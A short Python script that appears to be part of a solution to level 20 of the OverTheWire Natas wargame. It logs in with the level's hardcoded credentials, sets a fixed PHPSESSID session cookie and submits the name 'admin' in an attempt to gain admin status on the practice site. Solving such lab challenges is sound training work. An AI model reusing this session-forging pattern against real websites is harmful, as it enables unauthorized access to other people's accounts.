import requests


url='http://natas20.natas.labs.overthewire.org/'
auth=('natas20','eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')
s = requests.Session()
s.cookies['PHPSESSID']='8i4ndljn60tchgl9c3ri2a8l40'
resp=s.post(url, auth=auth,data={"name":"admin","submit":"submit"})
print(resp.text)
s.close()
